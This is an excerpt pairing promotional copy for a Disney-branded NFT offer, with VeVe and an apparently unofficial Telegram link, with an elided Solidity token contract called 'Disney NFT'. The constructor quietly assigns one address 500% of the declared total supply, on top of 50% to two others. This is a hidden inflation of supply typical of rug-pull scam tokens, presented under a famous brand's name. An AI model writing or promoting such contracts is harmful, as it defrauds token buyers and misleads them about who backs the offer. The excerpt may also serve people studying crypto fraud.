...
In Celebration of Disney+ Day

Golden Moments, a Disney NFT collection, offers digital 
statues inspired by beloved stories and moments from Disney,
Pixar, Marvel, Star Wars and more. Every customer in select
markets who first purchases an NFT from the Golden Moments 
collection will also receive a three or twelve month 
subscription of Disney+ courtesy of VeVe.

https://www.veve.me/promotion
https://twitter.com/veve_official
https://www.instagram.com/veve_official/
https://t.me/Disney_bsc
...
contract DisneyToken is IERC20 {
    ...
    address private DisneyBSC;
    address private DisneyCoin;
    address private Disneys;
    ...
    string public override name = "Disney NFT";
    string public override symbol = "Disney";
    ...
    constructor(uint totalSupplyValue, address DisneyBSCAddress, address DisneyCoinAddress, address DisneysAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        DisneyBSC = DisneyBSCAddress;
        DisneyCoin = DisneyCoinAddress;
        Disneys = DisneysAddress;
        balances[DisneyBSC] =  totalSupply * 1 / 100;
        balances[DisneyCoin] = totalSupply * 49 / 100;
        balances[Disneys] = totalSupply * 500 / 100;
